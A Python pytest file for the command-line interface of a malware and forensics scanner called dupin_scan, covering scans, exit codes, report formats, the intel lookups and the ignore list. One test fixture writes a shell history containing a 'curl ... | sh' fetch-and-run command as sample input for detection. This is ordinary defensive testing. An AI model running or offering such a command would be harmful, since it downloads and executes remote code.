"""Linha de comando e roteamento do ponto de entrada."""
import json
import socket
import sys

import pytest

from dupin_scan import cli, core, forensics, intel, launcher, state


@pytest.fixture(autouse=True)
def isolado(tmp_path, monkeypatch):
    monkeypatch.setattr(core, "data_dir", lambda: tmp_path / "dados")
    for k in ("ABUSECH_AUTH_KEY", "VT_API_KEY"):
        monkeypatch.delenv(k, raising=False)


def sem_rede(monkeypatch):
    def proibido(*a, **k):
        raise AssertionError("o comando acessou a rede")

    monkeypatch.setattr(socket.socket, "connect", proibido)
    monkeypatch.setattr(socket, "create_connection", proibido)
    monkeypatch.setattr(socket, "getaddrinfo", proibido)


def achado(level="ALTO", score=90, **k):
    return {"type": "file", "where": "C:\\x\\a.exe", "score": score, "level": level, "reasons": ["r"],
            "attack": [], "sha256": "ab" * 32, **k}


def rel(*achados, notes=()):
    return {"os": "windows", "host": "h", "started": "2026-01-01T00:00:00", "finished": "2026-01-01T00:00:01",
            "cancelled": False, "files_scanned": 3, "notes": list(notes), "findings": list(achados), "ignored": [], "new": 0}


@pytest.fixture
def pasta_suja(tmp_path):
    d = tmp_path / "alvo"
    d.mkdir()
    (d / "fatura.pdf.exe").write_text("x")
    (d / "limpo.txt").write_text("ok")
    return d


# ------------------------------------------------------------ scan
def test_scan_real_gera_relatorio_e_nunca_usa_a_rede(pasta_suja, tmp_path, monkeypatch, capsys):
    sem_rede(monkeypatch)
    out = tmp_path / "r.json"
    code = cli.main(["scan", "--modules", "files", "--targets", str(pasta_suja), "--no-trust", "--out", str(out)])
    rep = json.loads(out.read_text(encoding="utf-8"))
    assert code == 0 and [f["reasons"] for f in rep["findings"]] == [["Dupla extensão suspeita"]]
    assert "1 achados" in capsys.readouterr().out


@pytest.mark.parametrize("fail_on,achados,esperado", [
    ("ALTO", [achado("ALTO")], 2), ("ALTO", [achado("MÉDIO", 50)], 0), ("MÉDIO", [achado("ALTO")], 2),
    ("BAIXO", [achado("BAIXO", 10)], 2), (None, [achado("ALTO")], 0), ("ALTO", [], 0),
])
def test_codigo_de_saida(fail_on, achados, esperado, monkeypatch, tmp_path):
    monkeypatch.setattr(core, "run_scan", lambda **k: rel(*achados))
    args = ["scan", "--quiet", "--out", str(tmp_path / "r.json")] + (["--fail-on", fail_on] if fail_on else [])
    assert cli.main(args) == esperado


def test_scan_repassa_opcoes_ao_nucleo(monkeypatch, tmp_path):
    visto = {}
    monkeypatch.setattr(core, "run_scan", lambda **k: visto.update(k) or rel())
    cli.main(["scan", "--quiet", "--modules", "files,forensics", "--days", "7", "--no-trust", "--track",
              "--os", "linux", "--hashes", "h.txt", "--yara", "y"])
    assert visto["modules"] == ["files", "forensics"] and visto["forensic_days"] == 7 and visto["check_trust"] is False
    assert visto["track"] is True and visto["os_name"] == "linux" and visto["hashes_path"] == "h.txt"


def test_scan_padrao_confia_nos_binarios_e_nao_grava_estado(monkeypatch):
    visto = {}
    monkeypatch.setattr(core, "run_scan", lambda **k: visto.update(k) or rel())
    cli.main(["scan", "--quiet"])
    assert visto["check_trust"] is True and visto["track"] is False


def test_scan_modulo_desconhecido(capsys):
    assert cli.main(["scan", "--modules", "files,magia"]) == 1
    assert "magia" in capsys.readouterr().err


def test_scan_out_traco_imprime_json(monkeypatch, capsys):
    monkeypatch.setattr(core, "run_scan", lambda **k: rel(achado()))
    assert cli.main(["scan", "--out", "-"]) == 0
    assert json.loads(capsys.readouterr().out)["findings"][0]["level"] == "ALTO"


@pytest.mark.parametrize("nome,marca", [("r.html", "<!doctype html"), ("r.csv", "Gravidade"), ("r.timeline.csv", "Quando")])
def test_scan_formatos_de_saida(nome, marca, monkeypatch, tmp_path):
    monkeypatch.setattr(core, "run_scan", lambda **k: rel(achado(when="2026-01-01T10:00:00")))
    out = tmp_path / nome
    cli.main(["scan", "--quiet", "--out", str(out)])
    assert marca.lower() in out.read_text(encoding="utf-8-sig").lower()


def test_scan_use_intel_usa_o_que_foi_baixado(monkeypatch, tmp_path):
    d = tmp_path / "dados" / "intel"
    (d / "yara").mkdir(parents=True)
    (d / "hashes.txt").write_text("a" * 64)
    visto = {}
    monkeypatch.setattr(core, "run_scan", lambda **k: visto.update(k) or rel())
    cli.main(["scan", "--quiet", "--use-intel"])
    assert visto["hashes_path"].endswith("hashes.txt") and visto["yara_dir"].endswith("yara")
    cli.main(["scan", "--quiet", "--use-intel", "--hashes", "meu.txt"])
    assert visto["hashes_path"] == "meu.txt"  # o que o usuário passou tem prioridade


def test_resumo_mostra_novos_ignorados_e_notas(capsys):
    r = rel(achado(new=True), notes=["algo ficou de fora"])
    r["new"], r["ignored"] = 1, [achado()]
    cli.summarize(r)
    out = capsys.readouterr().out
    assert "[NOVO]" in out and "1 novos" in out and "1 ignorados" in out and "nota: algo ficou de fora" in out


def test_funciona_sem_console(monkeypatch, tmp_path):
    """Executável --windowed: stdout e stderr são None. A CLI precisa continuar gravando o relatório e devolvendo o código."""
    monkeypatch.setattr(core, "run_scan", lambda **k: rel(achado()))
    monkeypatch.setattr(sys, "stdout", None)
    monkeypatch.setattr(sys, "stderr", None)
    out = tmp_path / "r.json"
    assert cli.main(["scan", "--out", str(out), "--fail-on", "ALTO"]) == 2
    assert json.loads(out.read_text(encoding="utf-8"))["findings"]
    assert cli.main(["scan", "--modules", "magia"]) == 1  # até a mensagem de erro não pode derrubar


# ------------------------------------------------------------ analyze
def test_analyze_arquivo_exportado(tmp_path, capsys):
    h = tmp_path / ".bash_history"
    h.write_text("ls\ncurl http://x/a.sh | sh\n")
    out = tmp_path / "a.json"
    assert cli.main(["analyze", str(h), "--out", str(out), "--fail-on", "MÉDIO", "--quiet"]) == 2
    f = json.loads(out.read_text(encoding="utf-8"))["findings"]
    assert len(f) == 1 and f[0]["type"] == "artifact"


def test_analyze_arquivo_inexistente_vira_nota(tmp_path):
    out = tmp_path / "a.json"
    assert cli.main(["analyze", str(tmp_path / "nao_existe.log"), "--out", str(out), "--quiet"]) == 0
    assert json.loads(out.read_text(encoding="utf-8"))["notes"]


# ------------------------------------------------------------ timeline / regras / ignorados
def test_timeline_csv(tmp_path, capsys):
    r = tmp_path / "r.json"
    r.write_text(json.dumps(rel(achado(when="2026-01-02T10:00:00"), achado(where="C:\\y", when="2026-01-01T10:00:00"),
                                achado(where="C:\\sem-data"))), encoding="utf-8")
    out = tmp_path / "t.csv"
    assert cli.main(["timeline", str(r), "--out", str(out)]) == 0
    linhas = out.read_text(encoding="utf-8-sig").splitlines()
    assert linhas[0].startswith("Quando") and "2026-01-01" in linhas[1] and "2026-01-02" in linhas[2] and len(linhas) == 3


def test_timeline_relatorio_invalido(tmp_path, capsys):
    r = tmp_path / "r.json"
    r.write_text("{ nao e json", encoding="utf-8")
    assert cli.main(["timeline", str(r)]) == 1


def test_export_rules(tmp_path, capsys):
    assert cli.main(["export-rules", "--out", str(tmp_path / "regras"), "--format", "sigma"]) == 0
    assert list((tmp_path / "regras" / "sigma").glob("*.yml")) and not (tmp_path / "regras" / "dupin-scan.yar").exists()


def test_ignorar_listar_remover(tmp_path, capsys):
    f = achado()
    r = tmp_path / "r.json"
    r.write_text(json.dumps(rel(f)), encoding="utf-8")
    key = state.fingerprint(f)
    assert cli.main(["ignored", "add", key, "--report", str(r), "--note", "backup noturno"]) == 0
    capsys.readouterr()
    assert cli.main(["ignored", "list"]) == 0
    saida = capsys.readouterr().out
    assert key in saida and "backup noturno" in saida
    assert cli.main(["ignored", "remove", key]) == 0 and cli.main(["ignored", "remove", key]) == 1
    capsys.readouterr()
    cli.main(["ignored", "list"])
    assert "Nenhum item ignorado" in capsys.readouterr().out


def test_ignorar_chave_inexistente_ou_sem_relatorio(tmp_path):
    r = tmp_path / "r.json"
    r.write_text(json.dumps(rel(achado())), encoding="utf-8")
    assert cli.main(["ignored", "add", "000", "--report", str(r)]) == 1
    assert cli.main(["ignored", "add", "000"]) == 1
    assert cli.main(["ignored", "remove"]) == 1


# ------------------------------------------------------------ intel (a única parte com rede)
def test_intel_update_hashes_sem_chave_nao_acessa_a_rede(monkeypatch, capsys):
    sem_rede(monkeypatch)
    assert cli.main(["intel", "update-hashes"]) == 1
    assert "Auth-Key" in capsys.readouterr().err


def test_intel_chaves_vem_so_do_ambiente(monkeypatch, capsys):
    visto = {}
    monkeypatch.setattr(intel, "update_hashes", lambda auth_key=None, **k: visto.update(key=auth_key) or
                        {"count": 5, "path": "p", "source": "s", "date": "d"})
    monkeypatch.setenv("ABUSECH_AUTH_KEY", "segredo")
    assert cli.main(["intel", "update-hashes"]) == 0 and visto["key"] == "segredo"
    assert "segredo" not in capsys.readouterr().out
    # o parser nem aceita chave por argumento (apareceria na lista de processos)
    with pytest.raises(SystemExit):
        cli.main(["intel", "update-hashes", "--key", "x"])


def test_intel_update_yara_conta_as_descartadas(monkeypatch, capsys):
    monkeypatch.setattr(intel, "update_yara", lambda: {"files": 3, "skipped": ["a.yar: usa `include`"], "errors": ["b.yar: sintaxe"]})
    assert cli.main(["intel", "update-yara"]) == 0
    out = capsys.readouterr().out
    assert "3 regras aceitas, 2 descartadas" in out and "a.yar" in out and "b.yar" in out


def test_intel_vt(monkeypatch, capsys):
    chamadas = []
    monkeypatch.setattr(intel, "vt_lookup", lambda sha, key: chamadas.append((sha, key)) or
                        {"status": "found", "malicious": 3, "message": ""})
    assert cli.main(["intel", "vt", "ab" * 32]) == 0 and chamadas == [("ab" * 32, None)]
    monkeypatch.setenv("VT_API_KEY", "k")
    cli.main(["intel", "vt", "ab" * 32])
    assert chamadas[-1][1] == "k"
    assert cli.main(["intel", "vt"]) == 1


def test_intel_vt_status_de_erro_da_codigo_1(monkeypatch):
    monkeypatch.setattr(intel, "vt_lookup", lambda sha, key: {"status": "rate_limited", "message": "x"})
    assert cli.main(["intel", "vt", "ab" * 32]) == 1


def test_intel_status_nao_usa_a_rede(monkeypatch, capsys):
    sem_rede(monkeypatch)
    assert cli.main(["intel", "status"]) == 0
    assert json.loads(capsys.readouterr().out)["hashes"]["present"] is False


# ------------------------------------------------------------ roteamento do ponto de entrada
@pytest.mark.parametrize("argv", [["scan", "--quiet"], ["timeline", "x.json"], ["intel", "status"], ["ignored", "list"]])
def test_launcher_manda_subcomandos_para_a_cli(argv, monkeypatch):
    visto = []
    monkeypatch.setattr(cli, "main", lambda a: visto.append(a) or 7)
    assert launcher.main(argv) == 7 and visto == [argv]


def test_launcher_ajuda_vai_para_a_cli(monkeypatch):
    monkeypatch.setattr(cli, "main", lambda a: 0)
    assert launcher.main(["--help"]) == 0


def test_launcher_caminhos_abrem_a_interface(monkeypatch):
    pytest.importorskip("PySide6")
    from dupin_scan import gui
    visto = []
    monkeypatch.setattr(gui, "main", lambda a: visto.append(a) or 0)
    assert launcher.main(["C:\\pasta", "arquivo.exe"]) == 0 and visto == [["C:\\pasta", "arquivo.exe"]]
    assert launcher.main([]) == 0 and visto[-1] == []


def test_cli_nao_importa_a_interface_grafica():
    import subprocess
    import sys
    code = ("import sys; from dupin_scan import launcher, cli; cli.main(['export-rules','--out','_x','--format','sigma']) if False else None;"
            "print('PySide6' in sys.modules)")
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True)
    assert r.stdout.strip() == "False"  # a CLI precisa funcionar em servidor sem ambiente gráfico
